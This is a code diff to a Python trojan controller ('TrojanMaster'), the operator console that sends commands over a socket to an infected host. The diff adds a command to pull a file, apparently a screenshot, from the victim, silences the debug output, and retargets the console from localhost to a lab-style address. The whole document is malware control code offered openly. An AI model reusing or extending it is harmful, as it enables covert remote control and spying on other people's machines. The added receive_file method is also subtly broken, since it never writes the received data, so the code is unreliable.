@@ -1,5 +1,7 @@
 import socket, sys, threading
 
+from cme.connection import connection
+
 
 class TrojanMaster(threading.Thread):
     def __init__(self, conf_dict):
@@ -19,12 +21,18 @@ class TrojanMaster(threading.Thread):
 
     def send_message(self, message=None):
         self.connection.sendto(message.encode(), (self.target_host, self.target_port))
-        print("sent message: ", message)
+        # print("sent message: ", message)
 
     def receive_message(self):
         self.received_message = self.connection.recv(self.int_buff)
-        print("received message: ", self.received_message.decode())
+        # print("received message: ", self.received_message.decode())
         return self.received_message.decode()
+
+    def receive_file(self, filename="screenshot.png"):
+        with open(filename, "wb") as f:
+            f = self.connection.recv(self.int_buff)
+        print("Received file: %s" % filename)
+        return filename
 
     def trojan_logic(self):
         while True:
@@ -32,6 +40,10 @@ class TrojanMaster(threading.Thread):
             command = input(">>> ")
             if command == "":
                 print("Enter command string")
+            elif command[:3] == "--s":
+                self.send_message(command)
+                self.receive_file()
+                print(self.receive_message())
             elif command == "exit":
                 self.send_message(command)
                 self.close()
@@ -48,7 +60,7 @@ class TrojanMaster(threading.Thread):
         self.connection.close()
 
 def main():
-    conf_dict = {"target_host": "127.0.0.1", "target_port": 8080}
+    conf_dict = {"target_host": "10.0.2.4", "target_port": 8080}
     master_instance = TrojanMaster(conf_dict)
     master_instance.run()
 
